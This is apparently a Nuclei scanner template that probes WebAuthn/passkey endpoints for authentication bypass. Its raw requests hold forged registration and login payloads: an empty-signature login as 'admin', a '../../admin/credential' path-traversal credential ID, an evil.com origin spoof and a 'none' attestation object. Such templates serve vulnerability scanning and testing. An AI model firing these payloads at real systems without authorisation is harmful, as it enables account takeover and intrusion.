http:
- matchers:
  - dsl:
    - status_code_2 == 200 || contains(body_2, "success") || contains(body_2, "registered")
    type: dsl
  raw:
  - 'POST {{BaseURL}}/api/webauthn/register/begin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    Connection: close


    {"username":"test{{bypass_id}}","displayName":"Test"}

    '
  - "POST {{BaseURL}}/api/webauthn/register/finish HTTP/1.1\nHost: {{Hostname}}\n\
    Content-Type: application/json\nConnection: close\n\n{\n  \"id\": \"{{bypass_id}}\"\
    ,\n  \"rawId\": \"{{bypass_id}}\",\n  \"type\": \"public-key\",\n  \"response\"\
    : {\n    \"clientDataJSON\": \"eyJ0eXBlIjoid2ViYXV0aG4uY3JlYXRlIiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIsIm9yaWdpbiI6Imh0dHBzOi8vZXhhbXBsZS5jb20ifQ==\"\
    ,\n    \"attestationObject\": \"o2NmbXRkbm9uZWdhdHRTdG10oGhhdXRoRGF0YVjESZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2NFAAAAAAAAAAAAAAAAAAAAAAAAAAAAQPpMpcqUhe8WfBPpLSt_MJpLlGKeNxw\"\
    \n  }\n}\n"
- matchers:
  - dsl:
    - contains(body_2, "authenticated") || contains(body_2, "success") || contains(body_2,
      "token")
    type: dsl
  raw:
  - 'POST {{BaseURL}}/api/webauthn/login/begin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    Connection: close


    {"username":"admin"}

    '
  - "POST {{BaseURL}}/api/webauthn/login/finish HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\nConnection: close\n\n{\n  \"id\": \"admin-credential\",\n\
    \  \"rawId\": \"YWRtaW4tY3JlZGVudGlhbA==\",\n  \"type\": \"public-key\",\n  \"\
    response\": {\n    \"clientDataJSON\": \"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoibnVsbCIsIm9yaWdpbiI6Imh0dHBzOi8vZXhhbXBsZS5jb20ifQ==\"\
    ,\n    \"authenticatorData\": \"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA==\"\
    ,\n    \"signature\": \"\",\n    \"userHandle\": \"YWRtaW4=\"\n  }\n}\n"
- matchers:
  - dsl:
    - contains(body, "admin") || status_code == 200
    type: dsl
  raw:
  - 'POST {{BaseURL}}/api/webauthn/assertion/options HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    Cookie: session={{bypass_id}}

    Connection: close


    {"username":"victim","credentialId":"../../admin/credential"}

    '
- matchers:
  - dsl:
    - '!contains(body, "origin") || contains(body, "success")'
    type: dsl
  raw:
  - "POST {{BaseURL}}/webauthn/authenticate HTTP/1.1\nHost: {{Hostname}}\nOrigin:\
    \ https://evil.com\nContent-Type: application/json\nConnection: close\n\n{\n \
    \ \"id\": \"test\",\n  \"response\": {\n    \"clientDataJSON\": \"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0Iiwib3JpZ2luIjoiaHR0cHM6Ly9ldmlsLmNvbSIsImNoYWxsZW5nZSI6InRlc3QifQ==\"\
    ,\n    \"authenticatorData\": \"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA==\"\
    ,\n    \"signature\": \"MEUCIQCJhmX3dTVaKpJ7dTKAAzN1e5yrKxFW3E9U3Oks9pQq0wIgL0ePSFvHEkZqJ9IvwqPYGmCdA8LuVmVEFawH5TkxAY4=\"\
    ,\n    \"userHandle\": \"\"\n  }\n}\n"
- matchers:
  - condition: or
    type: word
    words:
    - registered
    - success
    - created
  raw:
  - "POST {{BaseURL}}/api/register/complete HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\nConnection: close\n\n{\n  \"attestationObject\": {\n    \"\
    fmt\": \"none\",\n    \"attStmt\": {},\n    \"authData\": \"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2NFAAAAAKlpay8TdTcLQ0iyVvdRjpIAIJ1VF8R5SBQHqSANisuWKdoqyNiPPGrwQRQDA8LkmO5I\"\
    \n  },\n  \"clientDataJSON\": \"eyJ0eXBlIjoid2ViYXV0aG4uY3JlYXRlIiwiY2hhbGxlbmdlIjoiYnlwYXNzIiwib3JpZ2luIjoiaHR0cDovL2xvY2FsaG9zdCJ9\"\
    \n}\n"
id: webauthn-passkey-bypass
info:
  author: geeknik
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-287,CWE-290,CWE-346
  description: 'Detects ACTUAL WebAuthn/Passkey implementation vulnerabilities including

    challenge reuse, signature validation bypass, attestation confusion,

    and credential ID manipulation that allow authentication bypass.

    '
  name: WebAuthn/Passkey Authentication Bypass Detection
  reference:
  - https://fidoalliance.org/specs/fido-v2.1-ps-20210615/fido-client-to-authenticator-protocol-v2.1-ps-20210615.html
  - https://webauthn.guide/
  severity: critical
  tags: webauthn,passkey,authentication,bypass,critical
variables:
  bypass_id: '{{randstr}}'
  callback: '{{interactsh-url}}'
